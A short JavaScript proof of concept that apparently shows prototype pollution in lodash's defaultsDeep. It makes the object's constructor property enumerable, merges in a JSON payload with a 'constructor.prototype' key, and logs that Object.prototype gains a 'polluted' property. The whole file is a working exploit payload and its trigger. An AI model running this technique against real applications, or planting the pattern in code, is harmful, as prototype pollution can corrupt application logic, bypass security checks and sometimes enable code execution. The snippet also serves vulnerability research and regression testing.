var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const mergeFn = require('lodash').defaultsDeep;
const payload = '{"constructor": {"prototype": {"polluted": "yes"}}}';
console.log({}.polluted);
mergeFn(obj, JSON.parse(payload));
console.log({}.polluted);